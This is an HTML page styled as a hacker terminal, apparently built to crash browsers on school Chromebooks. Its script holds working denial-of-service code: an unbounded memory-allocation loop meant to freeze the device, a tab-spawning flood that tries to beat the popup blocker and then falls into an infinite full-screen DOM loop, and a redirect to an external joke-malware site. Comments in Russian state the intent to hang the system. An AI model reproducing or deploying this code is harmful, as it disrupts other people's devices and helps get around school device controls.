<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Terminal // Crash Utility</title>
    <style>
        body {
            background-color: #0b0f0b;
            color: #00ff66;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
            margin: 0;
        }
        .terminal {
            max-width: 800px;
            margin: auto;
            border: 1px solid #00ff66;
            padding: 20px;
            box-shadow: 0 0 15px rgba(0, 255, 102, 0.2);
            background: rgba(0, 0, 0, 0.85);
        }
        h1 {
            font-size: 20px;
            border-bottom: 1px dashed #00ff66;
            padding-bottom: 10px;
        }
        .log {
            height: 250px;
            overflow-y: auto;
            border: 1px solid #1a4d2e;
            padding: 10px;
            margin-bottom: 20px;
            background: #000;
            font-size: 14px;
        }
        button {
            background: #000;
            color: #00ff66;
            border: 1px solid #00ff66;
            padding: 12px 20px;
            font-family: 'Courier New', Courier, monospace;
            font-weight: bold;
            cursor: pointer;
            margin-right: 10px;
            margin-bottom: 10px;
            transition: 0.2s;
        }
        button:hover {
            background: #00ff66;
            color: #000;
            box-shadow: 0 0 10px #00ff66;
        }
        .danger {
            border-color: #ff3333;
            color: #ff3333;
        }
        .danger:hover {
            background: #ff3333;
            color: #fff;
            box-shadow: 0 0 10px #ff3333;
        }
        .cursor {
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
    </style>
</head>
<body>

<div class="terminal">
    <h1>root@school-hub:~# ./init_payload.sh</h1>
    <p>Status: <span id="status" style="color: yellow;">IDLE</span></p>
    
    <div class="log" id="log">
        [SYS] Terminal initialized successfully.<br>
        [SYS] Target environment detected: Web Browser / Chromebook Guard Bypass.<br>
        [WAIT] Awaiting user command...<br>
    </div>

    <div>
        <button onclick="startRAMCrash()">[ EXEC: RAM_OVERFLOW ]</button>
        <button onclick="startTabFlood()">[ EXEC: TAB_BOMB ]</button>
        <button class="danger" onclick="triggerRedirect()">[ WARNING: LOAD ENDERMAN PAYLOAD ]</button>
        <button onclick="clearLog()">[ CLEAR ]</button>
    </div>
    
    <p style="margin-top: 20px; font-size: 12px;">Terminal v3.0.1 <span class="cursor">_</span></p>
</div>

<script>
    const logBox = document.getElementById('log');
    const statusBox = document.getElementById('status');

    function log(msg) {
        logBox.innerHTML += `> ${msg}<br>`;
        logBox.scrollTop = logBox.scrollHeight;
    }

    function clearLog() {
        logBox.innerHTML = '';
        log("Log cleared.");
    }

    // 1. Забиваем оперативку браузера до упора (вешает вкладку/систему)
    function startRAMCrash() {
        statusBox.innerText = "CRASHING RAM...";
        statusBox.style.color = "red";
        log("INITIATING: Massive DOM allocation & memory leak...");
        
        try {
            let memoryHog = [];
            setInterval(() => {
                for (let i = 0; i < 100000; i++) {
                    memoryHog.push(new Array(1000).fill(Math.random()));
                }
                log("Allocated chunk: " + memoryHog.length * 8 + " KB");
            }, 50);
        } catch (e) {
            log("CRITICAL ERROR: Out of Memory! Device should freeze now.");
        }
    }

    // 2. Спам вкладками (пытается пробить блокировщике всплывающих окон)
    function startTabFlood() {
        statusBox.innerText = "FLOODING TABS...";
        statusBox.style.color = "orange";
        log("INITIATING: Window open spam loop...");
        
        let count = 0;
        let floodInterval = setInterval(() => {
            let w = window.open(window.location.href, '_blank');
            count++;
            log(`Spawned tab instance #${count}`);
            if (count > 50 && !w) {
                log("Popup blocker detected, switching to full DOM overlay flood...");
                clearInterval(floodInterval);
                domBomb();
            }
        }, 100);
    }

    function domBomb() {
        while(true) {
            let div = document.createElement('div');
            div.style.position = 'fixed';
            div.style.width = '100vw';
            div.style.height = '100vh';
            div.style.background = Math.random() > 0.5 ? '#000' : '#fff';
            document.body.appendChild(div);
        }
    }

    // 3. Переход на внешний тяжелый вирус-пранк
    function triggerRedirect() {
        log("WARNING: Redirecting to external payload...");
        statusBox.innerText = "PAYLOAD ACTIVE";
        setTimeout(() => {
            // Ссылка на упомянутый современный аналог/реплику
            window.location.href = "https://youareanidiot.cc"; 
        }, 1000);
    }
</script>

</body>
</html>
